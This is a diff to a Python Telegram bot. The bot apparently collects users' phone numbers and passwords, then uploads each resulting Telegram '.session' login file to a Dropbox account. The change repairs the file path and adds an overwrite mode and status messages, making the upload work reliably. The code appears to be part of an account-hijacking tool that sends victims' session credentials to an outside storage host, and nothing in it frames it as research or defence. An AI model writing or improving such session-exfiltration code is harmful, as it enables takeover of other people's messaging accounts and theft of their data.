@@ -123,15 +123,21 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ASK_PASSWORD
 
 # ---- Upload Session File to Dropbox ----
+# ---- Upload Session File to Dropbox ----
 async def upload_session_to_dropbox(client, phone):
     """Uploads session file to Dropbox"""
-    session_file_path = f"sessions/{phone}"
-    dropbox_path = f"/sessions/{phone}"  # Path in Dropbox to save the session file
+    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
+    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"
+
+    if not os.path.exists(session_file_path):
+        print(f"❌ Session file not found for {phone}. Skipping upload.")
+        return
 
     with open(session_file_path, "rb") as f:
-        dbx.files_upload(f.read(), dropbox_path, mute=True)
+        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
+        
+    print(f"✅ Session file for {phone} uploaded to Dropbox.")
 
-    print(f"Session file for {phone} uploaded to Dropbox.")
 
 # ---- Cancel Command ----
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
